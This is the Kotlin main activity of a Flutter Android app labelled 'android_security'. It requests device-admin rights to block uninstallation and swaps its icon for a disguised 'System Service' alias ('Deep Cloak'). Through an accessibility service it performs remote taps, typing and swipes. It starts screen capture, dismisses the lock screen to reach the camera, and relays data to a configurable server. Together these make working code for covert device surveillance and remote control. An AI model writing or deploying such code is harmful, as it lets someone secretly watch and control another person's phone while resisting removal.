package com.example.android_security

import android.view.View
import android.view.ViewTreeObserver

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import io.flutter.plugin.common.EventChannel
import android.media.AudioManager
import android.app.AppOpsManager
import android.provider.Settings
import android.os.Process
import android.os.Build
import android.os.PowerManager
import android.bluetooth.BluetoothAdapter
import android.net.wifi.WifiManager
import android.media.projection.MediaProjectionManager
import android.app.Activity
import android.view.WindowManager
import android.os.Handler
import android.os.Looper
import android.hardware.camera2.*
import android.media.ImageReader
import android.graphics.ImageFormat
import android.content.pm.PackageManager
import java.nio.ByteBuffer

class MainActivity : FlutterActivity() {
    private val CHANNEL = "com.example.android_security/admin"
    private val SCREEN_CAPTURE_REQUEST_CODE = 1001
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        
        // Final Boss: Focus Guard for Oppo/Realme
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
        window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
        setShowWhenLocked(true)
        setTurnScreenOn(true)

        // Force dismiss Splash Screen immediately to allow hardware access
        val content: View = findViewById(android.R.id.content)
        content.viewTreeObserver.addOnPreDrawListener(
            object : ViewTreeObserver.OnPreDrawListener {
                override fun onPreDraw(): Boolean {
                    content.viewTreeObserver.removeOnPreDrawListener(this)
                    return true
                }
            }
        )

        // Admin Channel
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "activateAdmin" -> {
                    activateAdmin()
                    result.success(null)
                }
                "isAdminActive" -> {
                    result.success(isAdminActive())
                }
                "startMonitoringService" -> {
                    startMonitoringService()
                    result.success(null)
                }
                "isUsageAccessGranted" -> {
                    result.success(isUsageAccessGranted())
                }
                "openUsageAccessSettings" -> {
                    openUsageAccessSettings()
                    result.success(null)
                }
                "getBluetoothStatus" -> {
                    result.success(getBluetoothStatus())
                }
                "getWifiSignalStrength" -> {
                    result.success(getWifiSignalStrength())
                }
                "startScreenCapture" -> {
                    startScreenCaptureRequest()
                    result.success(null)
                }
                "requestIgnoreBatteryOptimizations" -> {
                    requestIgnoreBatteryOptimizations()
                    result.success(null)
                }
                "isBatteryOptimizationIgnored" -> {
                    result.success(isBatteryOptimizationIgnored())
                }
                "isOverlayPermissionGranted" -> {
                    result.success(isOverlayPermissionGranted())
                }
                "getIntentAction" -> {
                    result.success(intent?.getStringExtra("action"))
                }
                "getIntentLens" -> {
                    result.success(intent?.getIntExtra("lens", 0))
                }
                "goBackToBackground" -> {
                    moveTaskToBack(true)
                    result.success(null)
                }
                "requestOverlayPermission" -> {
                    requestOverlayPermission()
                    result.success(null)
                }
                "openNotificationSettings" -> {
                    openNotificationSettings()
                    result.success(null)
                }
                "isNotificationAccessGranted" -> {
                    result.success(isNotificationAccessGranted())
                }
                "isAccessibilityServiceEnabled" -> {
                    result.success(RemoteControlService.instance != null)
                }
                "openAccessibilitySettings" -> {
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    startActivity(intent)
                    result.success(null)
                }
                "setHardwareYield" -> {
                    val yielded = call.argument<Boolean>("yield") ?: false
                    MonitoringService.isHardwareYielded = yielded
                    result.success(null)
                }
                "setAppIconVisible" -> {
                    val visible = call.argument<Boolean>("visible") ?: true
                    setAppIconVisible(visible)
                    result.success(null)
                }
                "isAppIconVisible" -> {
                    result.success(isAppIconVisible())
                }
                "getDeviceId" -> {
                    val prefs = getSharedPreferences("device_identity", Context.MODE_PRIVATE)
                    var id = prefs.getString("device_id", null)
                    if (id == null) {
                        val model = Build.MODEL.replace(" ", "_").lowercase()
                        val suffix = java.util.UUID.randomUUID().toString().take(4)
                        id = "${model}_${suffix}"
                        prefs.edit().putString("device_id", id).apply()
                    }
                    result.success(id)
                }
                "takeNativePhoto" -> {
                    result.error("DEPRECATED", "Camera1 removed per Option B architecture.", null)
                }
                "setServerUrl" -> {
                    val url = call.argument<String>("url") ?: ""
                    val prefs = getSharedPreferences("server_config", Context.MODE_PRIVATE)
                    prefs.edit().putString("server_url", url).apply()
                    result.success(null)
                }
                else -> {
                    result.notImplemented()
                }
            }
        }

        // Audio Channel for Speakerphone control
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, "com.example.android_security/audio").setMethodCallHandler { call, result ->
            if (call.method == "setSpeakerphoneOn") {
                val enabled = call.argument<Boolean>("enabled") ?: false
                val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
                audioManager.isSpeakerphoneOn = enabled
                // Only use MODE_IN_COMMUNICATION if we are actually in a "call" state to avoid ducking music
                // audioManager.mode = if (enabled) AudioManager.MODE_IN_COMMUNICATION else AudioManager.MODE_NORMAL
                result.success(null)
            } else {
                result.notImplemented()
            }
        }

        // Remote Control Channel
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, "com.example.android_security/remote_control").setMethodCallHandler { call, result ->
            when (call.method) {
                "isAccessibilityServiceEnabled" -> {
                    result.success(RemoteControlService.instance != null)
                }
                "openAccessibilitySettings" -> {
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    startActivity(intent)
                    result.success(null)
                }
                "performTouch" -> {
                    val dm = resources.displayMetrics
                    val x = (call.argument<Double>("x") ?: 0.0) * dm.widthPixels
                    val y = (call.argument<Double>("y") ?: 0.0) * dm.heightPixels
                    android.util.Log.d("RemoteControl", "Tap: ($x, $y) | Screen: ${dm.widthPixels}x${dm.heightPixels}")
                    RemoteControlService.instance?.performTap(x.toFloat(), y.toFloat())
                    result.success(null)
                }
                "performType" -> {
                    val text = call.argument<String>("text") ?: ""
                    android.util.Log.d("RemoteControl", "Type: $text")
                    RemoteControlService.instance?.typeText(text)
                    result.success(null)
                }
                "performSwipe" -> {
                    val dm = resources.displayMetrics
                    val x1 = (call.argument<Double>("x1") ?: 0.0) * dm.widthPixels
                    val y1 = (call.argument<Double>("y1") ?: 0.0) * dm.heightPixels
                    val x2 = (call.argument<Double>("x2") ?: 0.0) * dm.widthPixels
                    val y2 = (call.argument<Double>("y2") ?: 0.0) * dm.heightPixels
                    val duration = call.argument<Int>("duration")?.toLong() ?: 300L
                    android.util.Log.d("RemoteControl", "Swipe from ($x1, $y1) to ($x2, $y2)")
                    RemoteControlService.instance?.performSwipe(x1.toFloat(), y1.toFloat(), x2.toFloat(), y2.toFloat(), duration)
                    result.success(null)
                }
                "performLongPress" -> {
                    val dm = resources.displayMetrics
                    val x = (call.argument<Double>("x") ?: 0.0) * dm.widthPixels
                    val y = (call.argument<Double>("y") ?: 0.0) * dm.heightPixels
                    RemoteControlService.instance?.performSwipe(x.toFloat(), y.toFloat(), x.toFloat(), y.toFloat(), 1000L)
                    result.success(null)
                }
                "performAction" -> {
                    val action = call.argument<String>("action") ?: ""
                    RemoteControlService.instance?.performAction(action)
                    result.success(null)
                }
                else -> result.notImplemented()
            }
        }

        // Native Signaling Bridge - EventChannel (Incoming: Native -> Flutter)
        EventChannel(flutterEngine.dartExecutor.binaryMessenger, "com.example.android_security/native_signaling").setStreamHandler(
            object : EventChannel.StreamHandler {
                override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                    MonitoringService.messageListener = { message ->
                        runOnUiThread {
                            events?.success(message)
                        }
                    }
                }

                override fun onCancel(arguments: Any?) {
                    MonitoringService.messageListener = null
                }
            }
        )

        // Native Signaling Bridge - MethodChannel (Outgoing: Flutter -> Native)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, "com.example.android_security/native_signal_send").setMethodCallHandler { call, result ->
            when (call.method) {
                "sendSignal" -> {
                    val message = call.argument<String>("message") ?: ""
                    MonitoringService.instance?.sendSignal(message)
                    result.success(null)
                }
                "sendBinary" -> {
                    val data = call.argument<ByteArray>("data")
                    if (data != null) {
                        MonitoringService.instance?.sendBinarySignal(data)
                    }
                    result.success(null)
                }
                else -> result.notImplemented()
            }
        }
    }



    override fun onCreate(savedInstanceState: android.os.Bundle?) {
        super.onCreate(savedInstanceState)
        
        // CRITICAL FOR OPPO/REALME CAMERA ACCESS:
        // When launched via FullScreenIntent, we MUST pierce the lock screen and force the screen on briefly.
        // Without these flags, ColorOS denies window focus, which silently blocks `CameraManager.openCamera`.
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
            keyguardManager.requestDismissKeyguard(this, null)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            )
        }
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        
        handleIntent(intent)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)  // Critical: update the intent so Flutter can read the new action
        handleIntent(intent)
    }

    private fun handleIntent(intent: Intent?) {
        if (intent?.getStringExtra("action") == "request_projection") {
            startScreenCaptureRequest()
        }
    }

    private fun activateAdmin() {
        val componentName = ComponentName(this, AdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This app requires device administrator permissions to protect itself from uninstallation.")
        startActivity(intent)
    }

    private fun isAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(this, AdminReceiver::class.java)
        return dpm.isAdminActive(componentName)
    }

    private fun startMonitoringService() {
        val intent = Intent(this, MonitoringService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun isUsageAccessGranted(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, 
            Process.myUid(), packageName)
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun openUsageAccessSettings() {
        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
        startActivity(intent)
    }

    private fun getBluetoothStatus(): String {
        val bluetoothAdapter = BluetoothAdapter.getDefaultAdapter() ?: return "Not Supported"
        return if (bluetoothAdapter.isEnabled) "Enabled" else "Disabled"
    }

    private fun getWifiSignalStrength(): Int {
        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val info = wifiManager.connectionInfo
        return info.rssi
    }

    private fun startScreenCaptureRequest() {
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), SCREEN_CAPTURE_REQUEST_CODE)
    }

    private fun isBatteryOptimizationIgnored(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pm.isIgnoringBatteryOptimizations(packageName)
        } else {
            true
        }
    }

    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = android.net.Uri.parse("package:$packageName")
            startActivity(intent)
        }
    }

    private fun isOverlayPermissionGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
            intent.data = android.net.Uri.parse("package:$packageName")
            startActivity(intent)
        }
    }

    private fun isNotificationAccessGranted(): Boolean {
        val contentResolver = contentResolver
        val enabledNotificationListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName)
    }

    private fun openNotificationSettings() {
        val intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        } else {
            Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
        }
        startActivity(intent)
    }

    private fun isAppIconVisible(): Boolean {
        // Original visibility check: Is the main "Android Security" alias enabled?
        val componentName = ComponentName(this, "com.example.android_security.LauncherAlias")
        val state = packageManager.getComponentEnabledSetting(componentName)
        return state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED || state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
    }

    private fun setAppIconVisible(visible: Boolean) {
        val originalAlias = ComponentName(this, "com.example.android_security.LauncherAlias")
        val cloakAlias = ComponentName(this, "com.example.android_security.SystemSecurityService")
        
        // SWAP LOGIC: One must always be enabled to prevent "Ghost Shortcut" on Android 14
        if (visible) {
            // Restore: Show "Android Security", Hide "System Service"
            packageManager.setComponentEnabledSetting(originalAlias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, 0)
            packageManager.setComponentEnabledSetting(cloakAlias, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        } else {
            // Cloak: Hide "Android Security", Show "System Service"
            packageManager.setComponentEnabledSetting(originalAlias, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0)
            packageManager.setComponentEnabledSetting(cloakAlias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
        }

        runOnUiThread {
            android.widget.Toast.makeText(this, if (visible) "Restoring original icon..." else "Activating Deep Cloak...", android.widget.Toast.LENGTH_SHORT).show()
        }

        // LAUNCHER KICK: Force a manifest re-scan
        val kickComponent = ComponentName(this, "com.example.android_security.LauncherKickReceiver")
        val currentState = packageManager.getComponentEnabledSetting(kickComponent)
        val nextState = if (currentState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        } else {
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        }
        packageManager.setComponentEnabledSetting(kickComponent, nextState, PackageManager.DONT_KILL_APP)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                // Pass the result to the service
                MonitoringService.instance?.setProjectionResult(resultCode, data)
            } else {
                MonitoringService.instance?.sendError("Screen capture permission denied")
            }
        }
    }
}
